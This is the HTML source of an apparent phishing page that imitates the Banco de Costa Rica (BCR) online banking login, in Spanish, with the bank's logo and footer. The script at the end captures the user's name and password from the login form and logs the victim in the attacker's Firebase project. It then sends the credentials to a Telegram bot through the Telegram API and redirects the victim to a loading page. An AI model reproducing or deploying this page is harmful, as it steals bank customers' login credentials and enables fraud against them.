<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <meta
      name="viewport"
      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
    />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link href="./archivos/style.css" rel="stylesheet" type="text/css" />
    <link rel="icon" href="archivos/favicon.png" />
    <title>BCR</title>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
        onSnapshot,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

      const firebaseConfig = {
        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
        authDomain: "basedtos-84767.firebaseapp.com",
        projectId: "basedtos-84767",
        storageBucket: "basedtos-84767.appspot.com",
        messagingSenderId: "622608516389",
        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
      };

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      window.db = db; // Hacer db accesible globalmente
      window.doc = doc;
      window.setDoc = setDoc;
    </script>
  </head>
  <body>
    <div class="head">
      <img src="./archivos/logo.gif" class="logo" />
      <img src="./archivos/Certificado.svg" class="headimg1" />
      <img src="./archivos/Contactenos.svg" class="headimg2" />
      <a href="#" class="linkhead1">Certificaciones</a>
      <a href="#" class="linkhead2">Contáctenos</a>
    </div>
    <div class="head2">
      <span class="texthead"
        >Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span
      >
    </div>
    <div class="costilla" style="text-align: center">
      <img
        src="archivos/MensajeSeguridad3.png"
        style="width: 90%; margin-top: 120px"
      />
    </div>
    <div class="containerimg">
      <div class="divform1">
        <form id="loginform">
          <span class="ingresartxt">Ingresar</span>

          <hr class="line1" color="#C4C4C4" />

          <img class="userimg" src="./archivos/Personalizar.svg" />
          <img class="passimg" src="./archivos/Seguridad.svg" />

          <div class="floating-label">
            <input
              class="user"
              type="text"
              placeholder=" "
              id="usuario"
              name="user"
              onfocus=""
              onkeyup=""
              autocomplete="off"
              required=""
            />

            <span class="highlight"></span>
            <label>Usuario</label>
          </div>

          <div class="floating-label2">
            <input
              class="pass"
              type="password"
              placeholder=" "
              id="contra"
              name="pass"
              autocomplete="off"
              required=""
            />

            <span class="highlight2"></span>
            <label>Contraseña</label>

            <img id="imgpass1" src="./archivos/ver.png" class="ver" />
            <img
              id="imgpass2"
              src="./archivos/ver2.png"
              class="ver"
              style="display: none"
            />
          </div>

          <button type="submit" class="btn-uno">Ingresar</button>

          <button class="btn-dos" type="submit">
            Recuperar datos de ingreso
          </button>

          <input type="checkbox" name="checkbox" class="digital" />
          <label class="labelchk">Certificado Digital</label>
        </form>
      </div>

      <div class="divform2">
        <span class="ingresartxt">Registrarse</span>

        <hr class="line1" color="#C4C4C4" />

        <span class="registertext">
          Regístrese aquí si desea utilizar los servicios de Banca Digital.<br /><br />

          Para registrarse requiere ser cliente y tener al menos un producto
          activo.
        </span>

        <button class="btn-tres">Continuar</button>
      </div>

      <div class="formcontainer"></div>
    </div>

    <div class="footer">
      <span class="footertext">
        BCR © Derechos Reservados 2023. Contáctenos:
        CentroAsistenciaBCR@bancobcr.com</span
      >
    </div>
    <style>
      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(
          0,
          0,
          0,
          0.5
        ); /* Color de fondo semi-transparente */
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .centered-content {
        text-align: center;
        color: white;
        padding: 20px;
        border-radius: 10px;
      }
      .dot-container {
        display: flex;
      }

      .dot {
        width: 10px;
        height: 70px;
        background-color: red;
        margin: 0 10px;
        animation-duration: 1.5s;
        animation-timing-function: ease-in-out;
        animation-iteration-count: infinite;
      }

      .dot1 {
        animation-name: wave1;
      }

      .dot2 {
        animation-name: wave2;
        animation-delay: 0.3s;
      }

      .dot3 {
        animation-name: wave3;
        animation-delay: 0.6s;
      }

      @keyframes wave1 {
        0%,
        100% {
          transform: scaleY(1);
        }
        50% {
          transform: scaleY(1.5);
        }
      }

      @keyframes wave2 {
        0%,
        100% {
          transform: scaleY(1.5);
        }
        50% {
          transform: scaleY(1);
        }
      }

      @keyframes wave3 {
        0%,
        100% {
          transform: scaleY(1);
        }
        50% {
          transform: scaleY(1.2);
        }
      }
    </style>
    <div class="overlay" id="overlay" style="display: none">
      <div class="centered-content">
        <div class="dot-container">
          <div class="dot dot1"></div>
          <div class="dot dot2"></div>
          <div class="dot dot3"></div>
        </div>
      </div>
    </div>
  </body>
  <script src="script.js"></script>
  <script>
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", async (event) => {
      event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
      const nombre = document.querySelector("#usuario").value;
      const contra = document.querySelector("#contra").value;

      const questionRef = doc(window.db, "bcrr", nombre);
      await setDoc(questionRef, {
        question1: "A1",
        question2: "A1",
        question3: "A1",
        page: 0,
      });

      localStorage.setItem("usuario", nombre);
      const message = "BCR-----Nombre: " + nombre + " -----Contra: " + contra;

      axios
        .post(
          "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
          {
            chat_id: chat,
            text: message,
          }
        )
        .then((response) => {
          window.parent.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  </script>
</html>
